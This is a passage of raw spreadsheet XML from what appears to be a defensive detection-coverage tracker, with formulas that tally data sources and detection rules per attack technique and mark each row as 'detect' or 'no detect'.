        <f t="array" ref="H113">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I113" s="9" t="str" cm="1">
        <f t="array" ref="I113">IF(SUM(IF($C113=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C113=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J113" s="9" t="str" cm="1">
        <f t="array" ref="J11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13" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M113" s="9" cm="1">
        <f t="array" ref="M113">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N113" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O113" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P113" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S11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13" t="s">
        <v>386</v>
      </c>
      <c r="U113" t="s">
        <v>835</v>
      </c>
      <c r="V113" t="s">
        <v>836</v>
      </c>
      <c r="W113" t="b">
        <v>1</v>
      </c>
      <c r="X113" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="114" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A114" t="s">
        <v>829</v>
      </c>
      <c r="B114" t="s">
        <v>837</v>
      </c>
      <c r="C114" t="s">
        <v>838</v>
      </c>
      <c r="D114" t="s">
        <v>3</v>
      </c>
      <c r="E114" t="s">
        <v>434</v>
      </c>
      <c r="F114" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G114" s="9" cm="1">
        <f t="array" ref="G114">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H114" s="9" t="str" cm="1">
        <f t="array" ref="H114">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I114" s="9" cm="1">
        <f t="array" ref="I114">IF(SUM(IF($C114=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C114=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J114" s="9" t="str" cm="1">
        <f t="array" ref="J11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14" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M114" s="9" cm="1">
        <f t="array" ref="M114">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N114" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O114" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P114" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S11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14" t="s">
        <v>658</v>
      </c>
      <c r="U114" t="s">
        <v>839</v>
      </c>
      <c r="V114" t="s">
        <v>840</v>
      </c>
      <c r="W114" t="b">
        <v>1</v>
      </c>
      <c r="X114" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="115" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A115" t="s">
        <v>829</v>
      </c>
      <c r="B115" t="s">
        <v>841</v>
      </c>
      <c r="C115" t="s">
        <v>271</v>
      </c>
      <c r="D115" t="s">
        <v>3</v>
      </c>
      <c r="E115" t="s">
        <v>463</v>
      </c>
      <c r="F115" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G115" s="9" cm="1">
        <f t="array" ref="G115">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H115" s="9" t="str" cm="1">
        <f t="array" ref="H115">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I115" s="9" t="str" cm="1">
        <f t="array" ref="I115">IF(SUM(IF($C115=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C115=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J115" s="9" t="str" cm="1">
        <f t="array" ref="J11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15" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M115" s="9" cm="1">
        <f t="array" ref="M115">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N115" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O115" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P115" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S11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15" t="s">
        <v>386</v>
      </c>
      <c r="U115" t="s">
        <v>842</v>
      </c>
      <c r="V115" t="s">
        <v>843</v>
      </c>
      <c r="W115" t="b">
        <v>1</v>
      </c>
      <c r="X115" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="116" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A116" t="s">
        <v>829</v>
      </c>
      <c r="B116" t="s">
        <v>844</v>
      </c>
      <c r="C116" t="s">
        <v>845</v>
      </c>
      <c r="D116" t="s">
        <v>3</v>
      </c>
      <c r="E116" t="s">
        <v>463</v>
      </c>
      <c r="F116" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G116" s="9" cm="1">
        <f t="array" ref="G116">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H116" s="9" t="str" cm="1">
        <f t="array" ref="H116">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I116" s="9" t="str" cm="1">
        <f t="array" ref="I116">IF(SUM(IF($C116=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C116=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J116" s="9" t="str" cm="1">
        <f t="array" ref="J11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16" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M116" s="9" cm="1">
        <f t="array" ref="M116">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N116" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O116" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P116" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S11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16" t="s">
        <v>666</v>
      </c>
      <c r="U116" t="s">
        <v>846</v>
      </c>
      <c r="V116" t="s">
        <v>847</v>
      </c>
      <c r="W116" t="b">
        <v>1</v>
      </c>
      <c r="X116" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="117" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A117" t="s">
        <v>829</v>
      </c>
      <c r="B117" t="s">
        <v>848</v>
      </c>
      <c r="C117" t="s">
        <v>337</v>
      </c>
      <c r="D117" t="s">
        <v>3</v>
      </c>
      <c r="E117" t="s">
        <v>849</v>
      </c>
      <c r="F117" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G117" s="9" cm="1">
        <f t="array" ref="G117">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H117" s="9" t="str" cm="1">
        <f t="array" ref="H117">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I117" s="9" t="str" cm="1">
        <f t="array" ref="I117">IF(SUM(IF($C117=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C117=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J117" s="9" t="str" cm="1">
        <f t="array" ref="J11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17" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M117" s="9" cm="1">
        <f t="array" ref="M117">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N117" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O117" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P117" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S11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17" t="s">
        <v>368</v>
      </c>
      <c r="U117" t="s">
        <v>850</v>
      </c>
      <c r="V117" t="s">
        <v>851</v>
      </c>
      <c r="W117" t="b">
        <v>1</v>
      </c>
      <c r="X117" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="118" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A118" t="s">
        <v>829</v>
      </c>
      <c r="B118" t="s">
        <v>852</v>
      </c>
      <c r="C118" t="s">
        <v>853</v>
      </c>
      <c r="D118" t="s">
        <v>3</v>
      </c>
      <c r="E118" t="s">
        <v>463</v>
      </c>
      <c r="F118" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G118" s="9" cm="1">
        <f t="array" ref="G118">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H118" s="9" t="str" cm="1">
        <f t="array" ref="H118">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I118" s="9" t="str" cm="1">
        <f t="array" ref="I118">IF(SUM(IF($C118=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C118=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J118" s="9" t="str" cm="1">
        <f t="array" ref="J11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18" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M118" s="9" cm="1">
        <f t="array" ref="M118">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N118" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O118" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P118" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S11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18" t="s">
        <v>368</v>
      </c>
      <c r="U118" t="s">
        <v>854</v>
      </c>
      <c r="V118" t="s">
        <v>855</v>
      </c>
      <c r="W118" t="b">
        <v>1</v>
      </c>
      <c r="X118" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="119" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A119" t="s">
        <v>829</v>
      </c>
      <c r="B119" t="s">
        <v>856</v>
      </c>
      <c r="C119" t="s">
        <v>338</v>
      </c>
      <c r="D119" t="s">
        <v>3</v>
      </c>
      <c r="E119" t="s">
        <v>849</v>
      </c>
      <c r="F119" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G119" s="9" cm="1">
        <f t="array" ref="G119">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H119" s="9" t="str" cm="1">
        <f t="array" ref="H119">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I119" s="9" t="str" cm="1">
        <f t="array" ref="I119">IF(SUM(IF($C119=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C119=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J119" s="9" t="str" cm="1">
        <f t="array" ref="J11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19" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M119" s="9" cm="1">
        <f t="array" ref="M119">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N119" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O119" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P119" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S11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19" t="s">
        <v>368</v>
      </c>
      <c r="U119" t="s">
        <v>857</v>
      </c>
      <c r="V119" t="s">
        <v>858</v>
      </c>
      <c r="W119" t="b">
        <v>1</v>
      </c>
      <c r="X119" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="120" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A120" t="s">
        <v>829</v>
      </c>
      <c r="B120" t="s">
        <v>859</v>
      </c>
      <c r="C120" t="s">
        <v>860</v>
      </c>
      <c r="D120" t="s">
        <v>3</v>
      </c>
      <c r="E120" t="s">
        <v>406</v>
      </c>
      <c r="F120" s="9">
        <f t="shared" si="1"/>
        <v>1</v>
      </c>
      <c r="G120" s="9" cm="1">
        <f t="array" ref="G120">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H120" s="9" t="str" cm="1">
        <f t="array" ref="H120">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I120" s="9" t="str" cm="1">
        <f t="array" ref="I120">IF(SUM(IF($C120=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C120=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J120" s="9" t="str" cm="1">
        <f t="array" ref="J12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20" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M120" s="9" cm="1">
        <f t="array" ref="M120">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N120" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O120" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P120" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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20" t="s">
        <v>861</v>
      </c>
      <c r="U120" t="s">
        <v>862</v>
      </c>
      <c r="V120" t="s">
        <v>863</v>
      </c>
      <c r="W120" t="b">
        <v>1</v>
      </c>
      <c r="X120" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="121" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A121" t="s">
        <v>829</v>
      </c>
      <c r="B121" t="s">
        <v>864</v>
      </c>
      <c r="C121" t="s">
        <v>865</v>
      </c>
      <c r="D121" t="s">
        <v>3</v>
      </c>
      <c r="E121" t="s">
        <v>406</v>
      </c>
      <c r="F121" s="9">
        <f t="shared" si="1"/>
        <v>1</v>
      </c>
      <c r="G121" s="9" cm="1">
        <f t="array" ref="G121">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H121" s="9" t="str" cm="1">
        <f t="array" ref="H121">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I121" s="9" t="str" cm="1">
        <f t="array" ref="I121">IF(SUM(IF($C121=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C121=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J121" s="9" t="str" cm="1">
        <f t="array" ref="J12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21" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M121" s="9" cm="1">
        <f t="array" ref="M121">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N121" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O121" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P121" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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21" t="s">
        <v>517</v>
      </c>
      <c r="U121" t="s">
        <v>866</v>
      </c>
      <c r="W121" t="b">
        <v>1</v>
      </c>
      <c r="X121" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="122" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A122" t="s">
        <v>829</v>
      </c>
      <c r="B122" t="s">
        <v>867</v>
      </c>
      <c r="C122" t="s">
        <v>868</v>
      </c>
      <c r="D122" t="s">
        <v>3</v>
      </c>
      <c r="E122" t="s">
        <v>463</v>
      </c>
      <c r="F122" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G122" s="9" cm="1">
        <f t="array" ref="G122">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H122" s="9" t="str" cm="1">
        <f t="array" ref="H122">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I122" s="9" t="str" cm="1">
        <f t="array" ref="I122">IF(SUM(IF($C122=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C122=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J122" s="9" t="str" cm="1">
        <f t="array" ref="J12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22" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M122" s="9" cm="1">
        <f t="array" ref="M122">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N122" s="9">
